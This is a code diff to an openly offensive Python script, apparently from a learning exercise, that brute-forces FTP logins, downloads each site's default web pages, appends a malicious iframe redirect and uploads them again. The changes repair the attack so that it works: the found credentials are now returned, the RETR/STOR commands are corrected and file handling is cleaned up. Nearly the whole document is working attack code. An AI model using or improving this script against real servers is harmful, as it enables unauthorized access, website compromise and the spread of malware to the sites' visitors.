@@ -21,7 +21,7 @@ def anonLogin(hostname):
         print("[+] " + str(hostname) + " FTP Anonymous Login Succeeded.")
         ftp.quit()
         return True
-    except Exception as e:
+    except Exception:
         print("[-]" + str(hostname) + " FTP Anonymous Login Failed.")
         return False
 
@@ -40,23 +40,26 @@ def bruteLogin(userName, passFile, hostname):
             ftp.login(userName, password)
             print("[+] " + str(hostname) + " FTP Login Succeeded: " + str(password))
             ftp.quit()
-            return True
-        except Exception as e:
-            print("[-]" + str(hostname) + "FTP login failed")
+            pF.close()
+            return (userName, password)
+        except Exception:
+            print("[-] " + str(hostname) + " FTP Login Failed.")
             pass
+    pF.close()
     print("[-] Password not found or could not bruteforce ftp login.")
+    return (None, None)
 
 
 def returnDefault(ftp):
     try:
         # try to list the directory contents
         dirlist = ftp.nlst()
-    except Exception as e:
+    except Exception:
         # print something if there s a error in printing
         dirlist = []
         print("[-] Could not list the Directory Contents.")
         print("[-] Skipping to Next target")
-        return
+        return []
     retList = []
     for filename in dirlist:
         # loop through each file in the directory and look for .php .htm .html files those are default page
@@ -72,17 +75,17 @@ def injectPage(ftp, page, redirect):
     # open the page in write mode adding the .tmp extension
     f = open(page + ".tmp", "w")
     # retrieve it with "RETR" command in ftp and write it inside the opened file f with .tmp
-    ftp.retrlines("RETR " + page, f.write)
-    print("Downloaded Page" + page)
+    ftp.retrlines("RETR " + page, lambda line: f.write(line + "\n"))
+    print("Downloaded Page: " + page)
     # then write the redirect page in .tmp again
     f.write(redirect)
     f.close()
     # print that the injection is finished
-    print("[+] Injected Malicious Iframe on" + page)
+    print("[+] Injected Malicious Iframe on " + page)
     # upload the injected page in ftp with "STOR" command in ftp
-    ftp.storlines("STOR" + page, open(page + ".tmp"))
+    ftp.storlines("STOR " + page, open(page + ".tmp"))
     # print that everythings is finished
-    print("[+]Uploaded Injected Page")
+    print("[+] Uploaded Injected Page")
 
 
 # full attack function
@@ -94,9 +97,10 @@ def attack(username, password, tgtHost, redirect):
         # if succed then return the default pages .html .php .htm
         defPage = returnDefault(ftp)
         # loop in default page and inject
-        for page in defPage:
-            injectPage(ftp, page, redirect)
-    except Exception as e:
+        if defPage:
+            for page in defPage:
+                injectPage(ftp, page, redirect)
+    except Exception:
         # handle error and print the attack has failed
         print("[-] FTP Attack Failed.")
         pass
@@ -121,7 +125,7 @@ def main():
     redirect = options.redirect
     passFile = options.passFile
     userName = options.userName
-    if tgtHosts == None or redirect == None:
+    if tgtHosts is None or redirect is None:
         print(parser.usage)
         exit(0)
     # loop through each target host given
@@ -136,15 +140,15 @@ def main():
             attack(userName, password, tgtHost, redirect)
 
         # if didn t work check if we have a passfile or not if yes we try to brute force
-        elif passFile != None:
+        elif passFile is not None:
             # if the brute force where successful store the username and password
             (userName, password) = bruteLogin(userName, passFile, tgtHost)
         # if the password exist print that we attack with it
-        if password != None:
+        if password is not None:
             print("[+] Using " + str(userName) + "/" + str(password) + " to attack")
             attack(userName, password, tgtHost, redirect)
 
 
 if __name__ == "__main__":
     main()
-# enjoy ,keep leaning  @Ricci
+# keep learning @Ricci
